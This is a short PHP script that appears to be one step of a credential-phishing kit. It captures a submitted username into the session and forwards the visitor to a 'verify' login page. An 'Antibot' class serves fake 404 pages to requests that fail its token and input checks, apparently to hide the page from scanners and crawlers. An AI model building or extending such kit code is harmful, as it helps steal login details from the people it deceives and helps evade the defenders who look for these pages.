<?php

    session_start();

    require_once '../spec/Comp.php';
    require_once '../spec/Antibot.php';

    $comps = new Comp;
    $antibot = new Antibot;

    $settings = $comps->settings();

    if (!$comps->checkToken()) {
        die($antibot->throw404());
    }

    if (isset($_POST['username'])) {
        if (!$comps->checkEmpty($_POST['username'])) {
            $_SESSION['username'] = $_POST['username'];
            $comps->headerX("../../Login/verify.php");
        } else {
            die($antibot->throw404());
        }
    } else {
        die($antibot->throw404());
    }